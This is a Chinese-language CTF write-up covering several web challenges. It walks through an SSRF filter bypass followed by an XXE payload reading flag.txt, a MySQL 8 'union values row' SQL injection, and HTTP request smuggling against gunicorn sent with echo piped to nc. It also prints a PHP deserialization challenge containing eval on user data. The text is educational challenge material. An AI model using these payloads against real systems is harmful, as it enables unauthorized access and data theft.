<h2 id="这是一道代码审计题"><a href="#这是一道代码审计题" class="headerlink" title="这是一道代码审计题"></a>这是一道代码审计题</h2><p>打开出现一个&#x2F;index查看源代码，提示要传参url。<br><img src="https://img-blog.csdnimg.cn/121972a9858d4f5d8fd12ca0a2baef47.jpeg" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>发现这个文件。<br>这是表情解密<br><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=937%EF%BC%8C%E7%84%B6%E5%90%8E%E5%BE%97%E5%88%B0">http://www.atoolbox.net/Tool.php?Id=937，然后得到</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    <span class="hljs-keyword">if</span>(control_key==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You have not access to this page!&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_ssrf</span>(<span class="hljs-params">url</span>):<br>    hostname = urlparse(url).hostname<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&#x27;https?://(?:[-\w.]|(?:%[\da-fA-F]&#123;2&#125;))+&#x27;</span>, url):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&#x27;https?://@(?:[-\w.]|(?:%[\da-fA-F]&#123;2&#125;))+&#x27;</span>, url):<br>                <span class="hljs-keyword">raise</span> BaseException(<span class="hljs-string">&quot;url format error&quot;</span>)<br>        <span class="hljs-keyword">if</span>  re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&#x27;https?://@(?:[-\w.]|(?:%[\da-fA-F]&#123;2&#125;))+&#x27;</span>, url):<br>            <span class="hljs-keyword">if</span> judge_ip(hostname):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;You not get the right clue!&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            ip_address = socket.getaddrinfo(hostname,<span class="hljs-string">&#x27;http&#x27;</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">4</span>][<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">if</span> is_inner_ipaddress(ip_address):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>,<span class="hljs-string">&quot;inner ip address attack&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;You not get the right clue!&quot;</span><br>    <span class="hljs-keyword">except</span> BaseException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-built_in">str</span>(e)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;unknow error&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ip2long</span>(<span class="hljs-params">ip_addr</span>):<br>    <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&quot;!L&quot;</span>, socket.inet_aton(ip_addr))[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_inner_ipaddress</span>(<span class="hljs-params">ip</span>):<br>    ip = ip2long(ip)<br>    <span class="hljs-built_in">print</span>(ip)<br>    <span class="hljs-keyword">return</span> ip2long(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == ip &gt;&gt; <span class="hljs-number">24</span> <span class="hljs-keyword">or</span> ip2long(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == ip &gt;&gt; <span class="hljs-number">24</span> <span class="hljs-keyword">or</span> ip2long(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">20</span> == ip &gt;&gt; <span class="hljs-number">20</span> <span class="hljs-keyword">or</span> ip2long(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">16</span> == ip &gt;&gt; <span class="hljs-number">16</span> <span class="hljs-keyword">or</span> ip2long(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == ip &gt;&gt; <span class="hljs-number">24</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf1</span>(<span class="hljs-params">ip</span>):<br>    forbidden_list = [ <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>]<br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> forbidden_list:<br>        <span class="hljs-keyword">if</span> ip <span class="hljs-keyword">and</span> word:<br>            <span class="hljs-keyword">if</span> word <span class="hljs-keyword">in</span> ip.lower():<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">judge_ip</span>(<span class="hljs-params">ip</span>):<br>    <span class="hljs-keyword">if</span>(waf1(ip)):<br>        <span class="hljs-keyword">return</span> Fasle<br>    <span class="hljs-keyword">else</span>:<br>        addr = addr.encode(encoding = <span class="hljs-string">&quot;utf-8&quot;</span>)<br>        ipp = base64.encodestring(addr)<br>        ipp = ipp.strip().lower().decode()<br>        <span class="hljs-keyword">if</span>(ip==ipp):<br>            <span class="hljs-keyword">global</span> control_key<br>            control_key = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> Fals<br></code></pre></td></tr></table></figure>
<p>源码只有返回为true的时候才可以触发，要让ip&#x3D;&#x3D;ipp,<br>addr&#x3D;127.0.0.1，将127.0.0.1进行base64编码，然后转小写base64解码和ip相同的话就为true，</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/index</span>?url=https:<span class="hljs-string">//</span>@mti3ljaumc4x <span class="hljs-string">//</span>一定要注意这里的@不能丢，<br>然后进行传参 得到一个cookie aW4gZmFjdCBjb29raWUgaXMgdXNlZnVsIQ==<br>将原来的cookie进行替换。<br>a_cookie = aW4gZmFjdCBjb29raWUgaXMgdXNlZnVsIQ==<br></code></pre></td></tr></table></figure>
<p>然后会得到一个xm。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs xml">function codelogin()&#123;<br>	var name = $(&quot;#name&quot;).val();<br>	var password = $(&quot;#password&quot;).val();<br>	if(name == &quot;&quot; || word == &quot;&quot;)&#123;<br>		alert(&quot;Please enter the username and password!&quot;);<br>		return;<br>	&#125;<br><br>	var data = &quot;<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>&quot; + name + &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>&quot; + password + &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span>&quot;;<br>    $.ajax(&#123;<br>    	contentType: &quot;application/xml;charset=utf-8&quot;,<br>        type: &quot;POST&quot;,<br>        url: &quot;codelogin&quot;,<br>        data: data,<br>        dataType: &quot;xml&quot;,<br>        anysc: false,<br>        success: function (result) &#123;<br>        	var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;<br>        	var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;<br>        	if(code == &quot;0&quot;)&#123;<br>        		$(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);<br>        	&#125;else if(code == &quot;1&quot;)&#123;<br>        		$(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);<br>        	&#125;else&#123;<br>        		$(&quot;.msg&quot;).text(&quot;error:&quot; + msg);<br>        	&#125;<br>        &#125;,<br>        error: function (XMLHttpRequest,textStatus,errorThrown) &#123;<br>            $(&quot;.msg&quot;).text(errorThrown + &#x27;:&#x27; + textStatus);<br>        &#125;<br>    &#125;);<br>&#125;<br>继续xml伪造，这里有xxe漏洞<br>```xml<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY f <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;./flag.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><br>	<span class="hljs-symbol">&amp;f;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>password<br><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>然后以post的方式传入  &#x2F;mti3ljaumc4x&#x2F;codelogin 就能得到flag<br>通过这个最主要是学会了把127.0.0.1过滤了，该怎么绕过，这里之前没见过，这次学会了通过base64的格式可以绕过。这里是一个知识点.</p>
<h2 id="Easy-SQL"><a href="#Easy-SQL" class="headerlink" title="Easy-SQL"></a>Easy-SQL</h2><p>59.110.159.206:7010?id&#x3D;-8 –+,得到一个<a href="mailto:&#x79;&#112;&#72;&#101;&#77;&#80;&#x61;&#x72;&#100;&#x45;&#114;&#69;&#x2e;&#x7a;&#x69;&#112;&#x40;&#98;&#x65;&#97;&#x78;&#105;&#x61;&#x2e;&#99;&#x6e;">&#x79;&#112;&#72;&#101;&#77;&#80;&#x61;&#x72;&#100;&#x45;&#114;&#69;&#x2e;&#x7a;&#x69;&#112;&#x40;&#98;&#x65;&#97;&#x78;&#105;&#x61;&#x2e;&#99;&#x6e;</a>，然后访问ypHeMPardErE.zip<br>会得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./config.php&quot;</span>;<br><span class="hljs-comment">// error_reporting(0);</span><br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$hostname</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$database</span>);<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_errno) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . <span class="hljs-variable">$conn</span>-&gt;connect_errno);<br>&#125; <br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Where is the database?&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;try ?id&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqlWaf</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|&gt;|&lt;|;|&quot;|\^|\||\ |\&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-variable">$s</span>))<br>        <span class="hljs-keyword">return</span> False;<br>    <span class="hljs-keyword">return</span> True;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) <br>&#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where id=<span class="hljs-subst">$id</span>&quot;</span>;<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select/is&#x27;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$safe</span>!==<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;No select!&quot;</span>);<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) <br>    &#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>] . <span class="hljs-string">&quot;&lt;/h3&gt;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3&gt;&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>] . <span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;br&gt;Error!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) <br>&#123;<br><br>    <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>    <span class="hljs-variable">$passwd</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);<br><br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-title function_ invoke__">sqlWaf</span>(<span class="hljs-variable">$passwd</span>) )<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;damn hacker&#x27;</span>);<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;$&#123;username&#125;&#x27; AND passwd= &#x27;$&#123;passwd&#125;&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>] )<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>] == <span class="hljs-variable">$passwd</span>)<br>            &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-variable">$flag</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;username or passwd wrong, are you admin?&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong user&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;user not exist or wrong passwd&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$conn</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>要求是post传参username,passwd.<br>$row[‘username’] &#x3D;&#x3D;&#x3D; ‘admin’ &amp;&amp;<br>$row[‘passwd’]和$row[‘passwd’] &#x3D;&#x3D; $passwd</p>
<p>payload ：username&#x3D;-1’ union values row(“admin”,”admin”,”admin”)%23&amp;passwd&#x3D;admin<br>通过这个题目学到了mysql8的特性，可以通过union values row方式可以读取内容。</p>
<h2 id="让我康康"><a href="#让我康康" class="headerlink" title="让我康康!"></a>让我康康!</h2><p>这是一个HTTP走私题目。<br>burpsuite抓包回显服务器是gunicorn&#x2F;20.0.0<br>这个服务器版本有HTTP走私漏洞，查看源代码，出现一个try flag，然后访问&#x2F;flag;.txt。<br><img src="https://img-blog.csdnimg.cn/0e046bdcd78c4a0d8fa46a0358e2c784.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>输入flag，回显一个flag is in ‘&#x2F;fl4g’</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">echo <span class="hljs-operator">-</span>en <span class="hljs-string">&quot;POST / HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: localhost<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Length: 76<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Sec-Websocket-Key1: x<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>xxxxxxxxPOST /fl4g HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: localhost<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Length: 55<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>POST / HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: 127.0.0.1:80<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span> <span class="hljs-operator">|</span> nc <span class="hljs-number">59.110</span>.<span class="hljs-number">159.206</span> <span class="hljs-number">7020</span><br></code></pre></td></tr></table></figure>
<p>回显本地访问。</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">echo <span class="hljs-operator">-</span>en <span class="hljs-string">&quot;GET / HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: localhost<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Length: 90<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Sec-Websocket-Key1: x<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>xxxxxxxxGET /fl4g HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: localhost<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>secr3t_ip:127.0.0.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Content-Length: 55<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>GET / HTTP/1.1<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>Host: 127.0.0.1:80<span class="hljs-subst">\r</span><span class="hljs-subst">\n</span><span class="hljs-subst">\r</span><span class="hljs-subst">\n</span>&quot;</span> <span class="hljs-operator">|</span> nc <span class="hljs-number">59.110</span>.<span class="hljs-number">159.206</span> <span class="hljs-number">7020</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/1ab02116a3f24b6da5ab8c43fd3ed180.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>这个题目学到了HTTP走私，&#x2F;r&#x2F;n的使用，对于TE，CL的方式也有了学习。</p>
<h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un3</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$un4</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;un0) &amp;&amp; <span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;un2))&#123;<br>            <span class="hljs-variable language_">$this</span> -&gt; <span class="hljs-title function_ invoke__">Givemeanew</span>();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span> -&gt; un3 === <span class="hljs-string">&#x27;unserialize&#x27;</span>)&#123;<br>                <span class="hljs-variable language_">$this</span> -&gt; <span class="hljs-title function_ invoke__">yigei</span>();<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable language_">$this</span> -&gt; <span class="hljs-title function_ invoke__">giao</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Givemeanew</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span> -&gt; un4 = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">un0</span>(<span class="hljs-variable">$this</span> -&gt; un1);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">yigei</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your output: &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;un4;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">giao</span>(<span class="hljs-params"></span>)</span>&#123;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;un2);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span> -&gt; un2.<span class="hljs-string">&#x27;hint.php&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure>
<p>通过php为协议读取hint内容</p>
